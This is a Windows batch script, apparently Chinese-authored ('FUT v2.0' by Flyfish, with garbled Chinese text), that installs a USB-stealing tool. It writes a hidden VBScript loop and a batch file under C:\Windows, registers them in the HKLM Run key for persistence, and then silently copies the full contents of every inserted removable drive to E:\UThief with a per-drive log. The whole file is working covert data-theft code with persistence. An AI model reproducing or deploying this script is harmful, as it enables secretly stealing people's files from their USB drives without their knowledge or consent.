@ECHO OFF
COLOR 0A&Prompt #
SET A=68 
SET B=1
:RE
SET /A B+=2
@MODE CON: COLS=%A% LINES=%B% 
IF %B% LSS 20 GOTO RE
SETLOCAL ENABLEDELAYEDEXPANSION
TITLE FUT U�̴�� V2.0              ����By:Flyfish

:Ban
ECHO.
ECHO  �X�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�[
ECHO  �U    FUT U�̴�� v2.0  �� by Flyfish     �U
ECHO  �^�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�a
ECHO  �X�����������������������������������������������������������������������������������������������������������������������������[
ECHO  ���� Release History                                            ��
ECHO  ��  _________________________________________________________   ��
ECHO  ��                                                              ��
ECHO  ��2015.10.22 FUT v2.0���Ӱ�װ����                               ��
ECHO  ��                                                              ��
ECHO  ��2015.09.28 FUT v2.0�ع�����,�޸�1.0�ദBug,��֧�ֶ��̵�ȡ!     ��
ECHO  ��                                                              ��
ECHO  ��2015.09.13 FUT v1.0����Xcopy+VBSʵ��,��������ܱ���U�̹���!    ��
ECHO  ��                                                              ��
ECHO  ��2014.07.19 USBС͵,ʹ��Copy+Pingʵ�ֻ�������                  ��
ECHO  ��                                                              ��
ECHO  �^�����������������������������������������������������������������������������������������������������������������������������a
ECHO   ����Y��ʼ��װ
ECHO.
CHOICE /C YNU /N /M "ȷ�ϰ�װ�밴 Y���˳��밴 N��ж���밴U��"
IF ERRORLEVEL 3 GOTO :Unsetup
IF ERRORLEVEL 2 EXIT /B 0
IF ERRORLEVEL 1 GOTO :Setup else EXIT /B 0


:Setup
ECHO on error resume next>C:\Windows\Fut2.vbs
ECHO Set ws = CreateObject("Wscript.Shell")>>C:\Windows\Fut2.vbs
ECHO do>>C:\Windows\Fut2.vbs
ECHO ws.run "Fut2.bat",vbhide>>C:\Windows\Fut2.vbs
ECHO wscript.sleep 20000>>C:\Windows\Fut2.vbs
ECHO loop>>C:\Windows\Fut2.vbs
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v FutMain /t REG_SZ /d "C:\Windows\Fut2.vbs" /f >NUL 2>NUL
ECHO ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>C:\Windows\Fut2.bat
ECHO ::    FUT2.0  Code by Flyfish>>C:\Windows\Fut2.bat
ECHO ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::>>C:\Windows\Fut2.bat
ECHO for %%%%a in (c d e f g h i j k l m n o p q r s t u v w x y z) do (>>C:\Windows\Fut2.bat
ECHO     for /f %%%%h in ('fsutil fsinfo drivetype %%%%a:^^^|findstr /i "Removable.* ���ƶ�"') do (>>C:\Windows\Fut2.bat
ECHO       set U=%%%%h>>C:\Windows\Fut2.bat
ECHO       call :Main>>C:\Windows\Fut2.bat
ECHO     )>>C:\Windows\Fut2.bat
ECHO )>>C:\Windows\Fut2.bat
ECHO GOTO :EOF>>C:\Windows\Fut2.bat

ECHO :Main>>C:\Windows\Fut2.bat
ECHO FOR /F "TOKENS=3" %%%%i IN ('FSUTIL FSINFO VOLUMEINFO %%U%%^^^|find "�����к�"') DO set A=%%%%i>>C:\Windows\Fut2.bat
ECHO FOR /F "delims=" %%%%i in ('type E:\UThief\%%A%%_id.txt') do set B=%%%%i>>C:\Windows\Fut2.bat
ECHO IF "%%A%%" == "%%B%%" (>>C:\Windows\Fut2.bat
ECHO    GOTO :EOF>>C:\Windows\Fut2.bat
ECHO    ) else (call :Run)>>C:\Windows\Fut2.bat

ECHO :Run>>C:\Windows\Fut2.bat
ECHO FOR /F "TOKENS=3" %%%%i IN ('FSUTIL FSINFO VOLUMEINFO %%U%%^^^|find "�����к�"') DO set A=%%%%i>>C:\Windows\Fut2.bat
ECHO ECHO %%A%%^>E:\UThief\%%A%%_id.txt>>C:\Windows\Fut2.bat
ECHO IF EXIST %%U%%\ProtectedUdisk.dll (>>C:\Windows\Fut2.bat
ECHO    GOTO :EOF>>C:\Windows\Fut2.bat
ECHO    ) else (>>C:\Windows\Fut2.bat
ECHO            ECHO %%Date%% %%TIME:~0,2%%:%%TIME:~3,2%% ��⵽��������%%U%%������^>^>E:\UThief\%%A%%_Log.txt>>C:\Windows\Fut2.bat
ECHO            ECHO D^|XCOPY /R /G /E /F /C /Y  %%U%%\*.* E:\UThief\%%A%%^>^>E:\UThief\%%A%%_Log.txt>>C:\Windows\Fut2.bat
ECHO            ECHO.^>^>E:\UThief\%%A%%_Log.txt)>>C:\Windows\Fut2.bat
ECHO          )>>C:\Windows\Fut2.bat

ECHO.
ECHO  �X�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�[
ECHO  �U    FUT U�̴�� v2.0          ��Code by Flyfish     �U
ECHO  �^�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�T�a
ECHO.
ECHO  ####��װ·��:C:\Windows\Fut2.bat��C:\Windows\Fut2.vbs
ECHO.
ECHO  ####����·��:HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run FutMain Fut2.vbs
ECHO.
ECHO  ####��װ�ɹ�����������˳���
ECHO.
PAUSE>NUL & EXIT

:Unsetup
CLS&ECHO.
ECHO  ####ɾ��������
REG DELETE "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v FutMain /f
ECHO  ####ɾ���Ѱ�װ����
del /f /q /s C:\Windows\Fut2.bat
ECHO.
ECHO  ####ж����ɣ���������˳���
PAUSE>NUL & EXIT